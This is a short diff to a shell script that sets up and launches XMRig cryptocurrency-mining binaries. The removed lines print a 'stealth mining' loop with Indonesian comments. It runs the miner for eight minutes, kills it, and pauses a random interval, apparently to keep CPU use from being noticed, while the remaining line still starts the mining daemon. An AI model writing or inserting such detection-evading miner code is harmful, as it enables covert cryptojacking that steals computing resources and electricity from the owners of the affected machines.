@@ -136,18 +136,4 @@ END
 chmod +x config.json xmrigDaemon xmrigMiner
 
 #run
-./xmrigDaemon &
-
-
-# Loop stealth mining: 8 menit ON, 2-3 menit OFF
-while true; do
-    echo "[+] Mining dimulai: $(date)"
-    ./xmrigMiner &
-    MINER_PID=$!
-
-    sleep 480  # 8 menit
-
-    echo "[+] Stop mining sementara: $(date)"
-    kill $MINER_PID
-    sleep $((40 + RANDOM % 51))  # 2 - 3 menit random
-done
+./xmrigDaemon 
